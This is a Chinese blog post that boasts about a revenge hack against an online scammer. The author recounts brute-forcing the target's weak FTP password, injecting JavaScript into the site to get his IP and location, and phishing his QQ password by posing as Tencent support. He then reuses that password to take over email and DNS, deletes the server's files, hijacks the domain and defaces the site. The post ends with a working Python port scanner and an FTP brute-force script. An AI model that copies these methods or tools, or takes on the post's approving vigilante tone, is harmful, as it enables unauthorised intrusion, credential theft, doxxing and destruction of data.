
--- 
title:  一个精壮的代购骗子被我用Python彻底征服了 
tags: []
categories: [] 

---
#### 0×01 苦逼的开头

当我朋友圈被代购侵犯时，觉得什么东西都好便宜的，有代购包的，潮牌的，化妆品的，一堆一堆的…当时我的心情是这样的

以前一直也相安无事，直到前天，找了个代购，想买买supreme的tee，作为一个冉冉升起的新星黑客，我竟然被骗了。。很扎心，被骗900多显然也够不成立案标准，但也够我买好几箱辣条了……气得我发下毒誓要顺着网线去打他……

我朋友圈的吐槽

事情不能就这么完了！我可是i春秋论坛的首席帅哥哥，反击行动开始！

过程真心比我想象的还要精彩，此所谓多行不义必自毙，哈哈哈。

由于最近我在写Python工具集，所以，文中所用的工具都自己开发吧……

#### 0×02 前期的破坏

那个代购之前跟我吹牛逼说，他有专门的网站….嘿嘿，这就好办了，我打算从这入手吧，于是，我搞了个WX小号，去加了那个代购的wx….先套出他的网站地址…..

然后就套到了他的网站地址…..尼玛，貌似没有一点难度….这怎么凸显我的社工能力，算了，看看他的网站吧…

接着来一波信息采集工作吧…

查了他的whois，并没有弄隐私保护，然后爆出了他的名字and手机号and邮箱，跟我被套路的时候，转账的手机号和名字一样唉….目测就是这货了

接下来，端口扫描，21端口开着…(我会在文章结尾放上工具脚本的….)

C段什么的就不做了，没什么大意义，目录扫描也不用了目测…这辣鸡意识..没谁了

不放过21端口的开启，来一波fuzz，万一弱口令呢….

FTP爆破工具走一波

尴尬了，我靠，直接就是弱口令，我的妈耶…..

差不多，整个站的权限已经在手上了….

然后传个黑页吗？？搞得感觉像个小学生，但是好气哦，后面搞得他更多的信息，就整个吧，啊哈哈…

#### 0×03 进击的巨人

他说他是日本代购，那咱们就定位一下他，到底在不在国外吧，呵呵哒

参考的方法是：`https://bbs.ichunqiu.com/thread-33742-1-1.html`

既然咱们已经拿到了他站的权限，那么，咱们可以在主页插入一段JS，获取他的ip

Index.php：

然后走一波套路….

洗洗先睡觉了，第二天继续….

睡一觉起来，上钩了..这二货还跟我解释….我有句mmp不知道当讲不当讲…

获得了他的经纬度

查询一下：`http://www.gpsspg.com/maps.htm`

好好的一个日本代购？？跑到国内了？？我特么的，竟然被他套路了，我心态崩了

以为到这就结束了？？

没有，远远不够……

既然咱们有他的手机号，那咱们可以尝试搜一波他的QQ

由于他的手机号绑定的就是他本人wx，就不继续测试wx了..

然后加他一波…万一成功了呢….

然后经过了n个小时的漫长等待，加上了….二话不说，直接进空间….

然后找到了他的自拍，我收回我之前要顺着网线去打他这句话….

然后继续套路他一波？？假装腾讯客服送他各种钻，万一他中招了….

我胡乱说的一些老套路，我自己都难说服自己的。。但是他竟然信了…..

这就获取到了他的QQ密码，所以一般人的安全意识还是很差的！！请不要骗黑客好吗！！

于是我尝试登了一下他的邮箱…

Qq邮箱凉凉了，有独立密码，我也猜不到..算了…

试试他之前的那个网易邮箱吧….

登上去，然而，什么都没有，目测是都删了…..

继续尝试下，用这个密码，咱们试下他的邮箱用户名是不是他的域名注册的那个id

然后我竟然直接登上去了…这是rp好吗？？

然后我又可以修改他的dns了…然后实现域名劫持什么的….反正我也有他FTP的权限，我先把它主机的东西全删了去….mmp…

然后来个域名劫持….修改他的解析，解析到我创的虚拟主机上….

然后差不多就结束了

#### 0×04 华丽的谢幕

挂上黑页..强行装一波….

拿到了这么多信息，可以找他摊牌了，mmp

我打算放过他了，毕竟他有了这次经历，估计也不敢再骗人了

毕竟我的心愿是世界和平…

#### 0×05 总结

这次可以算是运气好吧…..希望各位不要有当骗子的冲动，恶人是有恶报的…，你还要知道，人外有人，天外有天….附上文中所用的工具吧…

这里我放出的是单线程版的，期待我后面的系列文章吧，我会出多线程版的，啊哈哈哈

portscan.py

```
import socket

def Get_ip(domain):  

    try:  

        return socket.gethostbyname(domain)  

    except socket.error,e:  

        print ‘%s: %s’%(domain,e)  

        return 0 

 

def PortScan(ip):

    result_list=list()

    port_list=range(1,65535)

    for port in port_list:

        try:

            s=socket.socket() 

            s.settimeout(0.1)

            s.connect((ip,port))

            openstr= ” PORT:”+str(port) +” OPEN “

            print openstr

            result_list.append(port)

            s.close()

        except:

            pass

    print result_list

def main():

    domain = raw_input(“PLEASE INPUT YOUR TARGET:”)

    ip = Get_ip(domain)

    print ‘IP:’+ip

    PortScan(ip)

if __name__==’__main__’:  

    main()
```

BruteFTP.py

```
import ftplib
from ftplib import FTP

def Login(host,username,password):

    ftp=FTP()

    try:

        ftp.connect(host,21,1)

        ftp.login(username,password)

        print ‘Crack successly!’

        print ‘username：’ + username

        print ‘Password：’ + password

        return True

    except:

        pass

if __name__ == ‘__main__’:

        host=open(‘host.txt’)

        for line in host:

                host=line.strip(‘\n’)

                print ‘Target：’ + host

                user=open(‘user.txt’)

                for line in user:

                        user=line.strip(‘\n’)

                        pwd=open(‘pwd.txt’,'r’)

                        for line in pwd:

                                pwd=line.strip(‘\n’)

                                Login(host,user,pwd)
```

**<strong>往期回顾：**</strong>
- - - - - - - - 